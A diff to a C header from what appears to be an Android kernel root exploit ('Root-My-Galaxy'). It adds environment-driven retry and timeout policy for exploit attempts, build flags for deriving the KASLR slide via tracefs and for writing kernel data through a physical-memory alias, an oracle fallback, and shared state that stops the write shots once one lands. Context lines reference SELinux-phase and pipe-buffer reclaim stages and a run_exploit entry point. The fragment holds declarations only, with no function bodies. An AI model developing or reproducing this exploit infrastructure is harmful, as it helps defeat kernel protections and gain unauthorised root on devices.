@@ -101,6 +101,39 @@ extern int pipe_fds_reclaim[PIPE_RECLAIM][2];
 #define SELINUX_PHASE_ATTEMPTS 10
 #define PIPE_FLAG_PHASE_ATTEMPTS 20
 
+/* --- Root-My-Galaxy route policy (feed-defined, delivered via env) ---
+ * The app passes EXPLOIT_ATTEMPTS / EXPLOIT_ATTEMPT_TIMEOUT_SEC /
+ * P0_ATTEMPT_TIMEOUT_SEC / SLIDE_SOURCE / SLIDE_P0_OFFSET from the
+ * target's routePolicy. Defaults reproduce the validated h8q baseline. */
+#define POLICY_DEFAULT_ATTEMPTS            24
+#define POLICY_DEFAULT_ATTEMPT_TIMEOUT_SEC 120
+#define POLICY_DEFAULT_P0_TIMEOUT_SEC      45
+
+extern int g_exploit_attempts;      /* per-phase write-shot cap from policy */
+extern int g_attempt_timeout_sec;   /* per-attempt deadline */
+extern int g_p0_timeout_sec;        /* P0 oracle deadline */
+void policy_init_from_env(void);
+
+/* --- Payload build flags (baked per-target; h8q app payload sets all) --- */
+#ifndef APP_TRACEFS_SLIDE
+#define APP_TRACEFS_SLIDE 0        /* derive KASLR slide from Tracefs */
+#endif
+#ifndef APP_TRACEFS_PHYS_ALIAS_DATA
+#define APP_TRACEFS_PHYS_ALIAS_DATA 0 /* data writes via physical-load alias */
+#endif
+#ifndef APP_PHYS_P0_ORACLE
+#define APP_PHYS_P0_ORACLE 0       /* SLIDE_P0_OFFSET oracle fallback */
+#endif
+#ifndef APP_FOPS_RETRY_BUDGET
+#define APP_FOPS_RETRY_BUDGET 0    /* 0 = legacy unbounded phase attempts */
+#endif
+
+/* Shared FOPS retry state + per-shot delay rotation. A landed write sets
+ * route_verified, which terminates further shots across all threads. */
+extern atomic_int route_verified;
+extern atomic_int fops_shot;        /* monotonic shot counter (delay rotation) */
+int fops_shot_delay_usec(void);     /* rotating delay for the current shot */
+
 #define P0_KERNEL_PHYS_DELTA (P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET)
 #define P0_DATA_ALIAS_CONST(image_addr) \
   (P0_PAGE_OFFSET | ((image_addr) - KIMAGE_TEXT_BASE + P0_KERNEL_PHYS_DELTA))
@@ -165,9 +198,9 @@ extern uintptr_t pipebuf_page_base;
 extern int kaslr_done;
 extern uint64_t kaslr_base;
 extern uint64_t kaslr_slide;
-extern int route_verified;
 
 int run_exploit(int argc, char **argv);
+void ghost_mark(const char *fmt, ...);
 void read_first_line(const char *path, char *buf, size_t len);
 int is_selinux_enforcing(void);
 void disable_rseq_for_thread(void);
